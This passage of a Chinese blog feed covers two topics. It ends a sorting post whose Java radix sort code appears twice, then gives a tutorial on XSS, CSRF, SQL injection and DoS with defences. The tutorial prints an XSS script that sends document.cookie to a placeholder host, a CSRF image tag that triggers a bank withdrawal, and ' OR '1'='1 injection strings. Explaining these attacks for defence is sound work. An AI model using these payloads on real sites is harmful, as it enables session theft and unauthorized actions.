基数排序</h1><p>基数排序是一种非比较型整数排序算法，其原理是将整数按位数切割成不同的数字，然后按每个位数分别比较。由于整数也可以表达字符串（比如名字或日期）和特定格式的浮点数，所以基数排序也不是只能使用于整数。</p><p>LSD 基数排序动图演示</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/radixsort.gif" alt="img" style="zoom:50%;" /></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 基数排序</span></span><br><span class="line"><span class="comment"> * 考虑负数的情况还可以参考： https://code.i-harness.com/zh-CN/q/e98fa9</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RadixSort</span> <span class="keyword">implements</span> <span class="title">IArraySort</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] sort(<span class="keyword">int</span>[] sourceArray) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 对 arr 进行拷贝，不改变参数内容</span></span><br><span class="line">        <span class="keyword">int</span>[] arr = Arrays.copyOf(sourceArray, sourceArray.length);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> maxDigit = getMaxDigit(arr);</span><br><span class="line">        <span class="keyword">return</span> radixSort(arr, maxDigit);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取最高位数</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">getMaxDigit</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> maxValue = getMaxValue(arr);</span><br><span class="line">        <span class="keyword">return</span> getNumLenght(maxValue);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">getMaxValue</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> maxValue = arr[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> value : arr) &#123;</span><br><span class="line">            <span class="keyword">if</span> (maxValue &lt; value) &#123;</span><br><span class="line">                maxValue = value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">getNumLenght</span><span class="params">(<span class="keyword">long</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (num == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> lenght = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">long</span> temp = num; temp != <span class="number">0</span>; temp /= <span class="number">10</span>) &#123;</span><br><span class="line">            lenght++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> lenght;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] radixSort(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> maxDigit) &#123;</span><br><span class="line">        <span class="keyword">int</span> mod = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">int</span> dev = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; maxDigit; i++, dev *= <span class="number">10</span>, mod *= <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="comment">// 考虑负数的情况，这里扩展一倍队列数，其中 [0-9]对应负数，[10-19]对应正数 (bucket + 10)</span></span><br><span class="line">            <span class="keyword">int</span>[][] counter = <span class="keyword">new</span> <span class="keyword">int</span>[mod * <span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; arr.length; j++) &#123;</span><br><span class="line">                <span class="keyword">int</span> bucket = ((arr[j] % mod) / dev) + mod;</span><br><span class="line">                counter[bucket] = arrayAppend(counter[bucket], arr[j]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> pos = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span>[] bucket : counter) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> value : bucket) &#123;</span><br><span class="line">                    arr[pos++] = value;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 自动扩容，并保存数据</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> arr</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> value</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] arrayAppend(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> value) &#123;</span><br><span class="line">        arr = Arrays.copyOf(arr, arr.length + <span class="number">1</span>);</span><br><span class="line">        arr[arr.length - <span class="number">1</span>] = value;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 基数排序</span></span><br><span class="line"><span class="comment"> * 考虑负数的情况还可以参考： https://code.i-harness.com/zh-CN/q/e98fa9</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RadixSort</span> <span class="keyword">implements</span> <span class="title">IArraySort</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] sort(<span class="keyword">int</span>[] sourceArray) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 对 arr 进行拷贝，不改变参数内容</span></span><br><span class="line">        <span class="keyword">int</span>[] arr = Arrays.copyOf(sourceArray, sourceArray.length);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> maxDigit = getMaxDigit(arr);</span><br><span class="line">        <span class="keyword">return</span> radixSort(arr, maxDigit);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取最高位数</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">getMaxDigit</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> maxValue = getMaxValue(arr);</span><br><span class="line">        <span class="keyword">return</span> getNumLenght(maxValue);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">getMaxValue</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> maxValue = arr[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> value : arr) &#123;</span><br><span class="line">            <span class="keyword">if</span> (maxValue &lt; value) &#123;</span><br><span class="line">                maxValue = value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">getNumLenght</span><span class="params">(<span class="keyword">long</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (num == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> lenght = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">long</span> temp = num; temp != <span class="number">0</span>; temp /= <span class="number">10</span>) &#123;</span><br><span class="line">            lenght++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> lenght;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] radixSort(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> maxDigit) &#123;</span><br><span class="line">        <span class="keyword">int</span> mod = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">int</span> dev = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; maxDigit; i++, dev *= <span class="number">10</span>, mod *= <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="comment">// 考虑负数的情况，这里扩展一倍队列数，其中 [0-9]对应负数，[10-19]对应正数 (bucket + 10)</span></span><br><span class="line">            <span class="keyword">int</span>[][] counter = <span class="keyword">new</span> <span class="keyword">int</span>[mod * <span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; arr.length; j++) &#123;</span><br><span class="line">                <span class="keyword">int</span> bucket = ((arr[j] % mod) / dev) + mod;</span><br><span class="line">                counter[bucket] = arrayAppend(counter[bucket], arr[j]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> pos = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span>[] bucket : counter) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> value : bucket) &#123;</span><br><span class="line">                    arr[pos++] = value;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 自动扩容，并保存数据</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> arr</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> value</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] arrayAppend(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> value) &#123;</span><br><span class="line">        arr = Arrays.copyOf(arr, arr.length + <span class="number">1</span>);</span><br><span class="line">        arr[arr.length - <span class="number">1</span>] = value;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">整理了十种排序算法的思路和实现。</summary>
    
    
    
    <category term="算法" scheme="http://lishuaiyun.cn/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="算法" scheme="http://lishuaiyun.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="排序" scheme="http://lishuaiyun.cn/tags/%E6%8E%92%E5%BA%8F/"/>
    
  </entry>
  
  <entry>
    <title>网络攻击</title>
    <link href="http://lishuaiyun.cn/2021/03/17/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB/"/>
    <id>http://lishuaiyun.cn/2021/03/17/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB/</id>
    <published>2021-03-17T12:40:09.000Z</published>
    <updated>2022-03-26T13:16:07.534Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-跨站脚本攻击"><a href="#1-跨站脚本攻击" class="headerlink" title="1. 跨站脚本攻击"></a>1. 跨站脚本攻击</h1><h2 id="1-1-概念"><a href="#1-1-概念" class="headerlink" title="1.1 概念"></a>1.1 概念</h2><p>跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。</p><h2 id="1-2-攻击原理"><a href="#1-2-攻击原理" class="headerlink" title="1.2 攻击原理"></a>1.2 攻击原理</h2><p>例如有一个论坛网站，攻击者可以在上面发布以下内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href=<span class="string">&quot;//domain.com/?c=&quot;</span> + <span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>之后该内容可能会被渲染成以下形式：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href=<span class="string">&quot;//domain.com/?c=&quot;</span> + <span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。</p><h2 id="1-3-危害"><a href="#1-3-危害" class="headerlink" title="1.3 危害"></a>1.3 危害</h2><ul><li>窃取用户的 Cookie</li><li>伪造虚假的输入表单骗取个人信息</li><li>显示伪造的文章或者图片</li></ul><h2 id="1-4-防范手段"><a href="#1-4-防范手段" class="headerlink" title="1.4 防范手段"></a>1.4 防范手段</h2><p><strong>设置 Cookie 为 HttpOnly</strong></p><p>设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。</p><p><strong>过滤特殊字符</strong></p><p>例如将 <code>&lt;</code> 转义为 &amp;lt，将 <code>&gt;</code> 转义为 &amp;gt，从而避免 HTML 和 Jascript 代码的运行。</p><p>富文本编辑器允许用户输入 HTML 代码，就不能简单地将 <code>&lt;</code> 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。</p><p>富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，通过定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。</p><p>以下例子中，form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;title&quot;</span>&gt;</span>XSS Demo<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>123<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;q&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">alert(<span class="regexp">/xss/</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>XSS Demo<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>123<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">&amp;lt;</span>form<span class="symbol">&amp;gt;</span></span><br><span class="line">  <span class="symbol">&amp;lt;</span>input type=&quot;text&quot; name=&quot;q&quot; value=&quot;test&quot;<span class="symbol">&amp;gt;</span></span><br><span class="line"><span class="symbol">&amp;lt;</span>/form<span class="symbol">&amp;gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">&amp;lt;</span>script type=&quot;text/javascript&quot;<span class="symbol">&amp;gt;</span></span><br><span class="line">alert(/xss/);</span><br><span class="line"><span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><a href="http://jsxss.com/zh/try.html">XSS 过滤在线测试(opens new window)</a></p></blockquote><h1 id="2-跨站请求伪造"><a href="#2-跨站请求伪造" class="headerlink" title="2. 跨站请求伪造"></a>2. 跨站请求伪造</h1><h2 id="2-1-概念"><a href="#2-1-概念" class="headerlink" title="2.1 概念"></a>2.1 概念</h2><p>跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。</p><p>XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。</p><h2 id="2-2-攻击原理"><a href="#2-2-攻击原理" class="headerlink" title="2.2 攻击原理"></a>2.2 攻击原理</h2><p>假如一家银行用以执行转账操作的 URL 地址如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName。</span><br></pre></td></tr></table></figure><p>那么，一个恶意攻击者可以在另一个网站上放置如下代码：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman&quot;&gt;。</span><br></pre></td></tr></table></figure><p>如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 美元。</p><p>这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。</p><p>通过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。</p><h2 id="2-3-防范手段"><a href="#2-3-防范手段" class="headerlink" title="2.3 防范手段"></a>2.3 防范手段</h2><p><strong>检查 Referer 首部字段</strong></p><p>Referer 首部字段位于 HTTP 报文中，用于标识请求来源的地址。检查这个首部字段并要求请求来源的地址在同一个域名下，可以极大的防止 CSRF 攻击。</p><p>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。</p><p><strong>添加校验 Token</strong></p><p>在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。</p><p><strong>输入验证码</strong></p><p>因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。</p><h1 id="3-SQL-注入攻击"><a href="#3-SQL-注入攻击" class="headerlink" title="3. SQL 注入攻击"></a>3. SQL 注入攻击</h1><h2 id="3-1-概念"><a href="#3-1-概念" class="headerlink" title="3.1 概念"></a>3.1 概念</h2><p>服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。</p><h2 id="3-2-攻击原理"><a href="#3-2-攻击原理" class="headerlink" title="3.2 攻击原理"></a>3.2 攻击原理</h2><p>例如一个网站登录验证的 SQL 查询代码为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strSQL <span class="operator">=</span> &quot;SELECT * FROM users WHERE (name = &#x27;&quot; <span class="operator">+</span> userName <span class="operator">+</span> &quot;&#x27;) and (pw = &#x27;&quot;<span class="operator">+</span> passWord <span class="operator">+</span>&quot;&#x27;);&quot;</span><br></pre></td></tr></table></figure><p>如果填入以下内容：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">userName <span class="operator">=</span> &quot;1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;;</span><br><span class="line">passWord <span class="operator">=</span> &quot;1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;;</span><br></pre></td></tr></table></figure><p>那么 SQL 查询字符串为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strSQL <span class="operator">=</span> &quot;SELECT * FROM users WHERE (name = &#x27;1&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;) and (pw = &#x27;1&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;);&quot;</span><br></pre></td></tr></table></figure><p>此时无需验证通过就能执行以下查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strSQL <span class="operator">=</span> &quot;SELECT * FROM users;&quot;</span><br></pre></td></tr></table></figure><h2 id="3-3-防范手段"><a href="#3-3-防范手段" class="headerlink" title="3.3 防范手段"></a>3.3 防范手段</h2><p><strong>使用参数化查询</strong></p><p>Java 中的 PreparedStatement 是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PreparedStatement stmt = connection.prepareStatement(<span class="string">&quot;SELECT * FROM users WHERE userid=? AND password=?&quot;</span>);</span><br><span class="line">stmt.setString(<span class="number">1</span>, userid);</span><br><span class="line">stmt.setString(<span class="number">2</span>, password);</span><br><span class="line">ResultSet rs = stmt.executeQuery();</span><br></pre></td></tr></table></figure><p>PreparedStatement可以防止SQL注入的重要原因是预编译和占位符的使用：</p><p>原始代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from student where id = <span class="number">123</span>;</span><br></pre></td></tr></table></figure><p>SQL注入代码：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> id = <span class="number">123</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span> = <span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure><p>此时数据库认为id = 123和‘1’ = ‘1’成立一个即可，如果使用预编译：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> id = (<span class="number">123</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span> = <span class="string">&#x27;1&#x27;</span>);</span><br></pre></td></tr></table></figure><p>传入的参数被作为整体代入占位符。</p><p><strong>单引号转换</strong></p><p>将传入的参数中的单引号转换为连续两个单引号，PHP 中的 Magic quote 可以完成这个功能。</p><h1 id="4-拒绝服务攻击"><a href="#4-拒绝服务攻击" class="headerlink" title="4. 拒绝服务攻击"></a>4. 拒绝服务攻击</h1><p>拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。</p><p>分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。</p>]]></content>
    
    
    <summary type="html">系统设计的安全性，列举常见的网络攻击方式和防范方法</summary>
    
    
    
    <category term="系统设计" scheme="http://lishuaiyun.cn/categories/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/"/>
    
    
    <category term="安全" scheme="http://lishuaiyun.cn/tags/%E5%AE%89%E5%85%A8/"/>
    
    <category term="系统设计" scheme="http://lishuaiyun.cn/tags/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>牧马人</title>
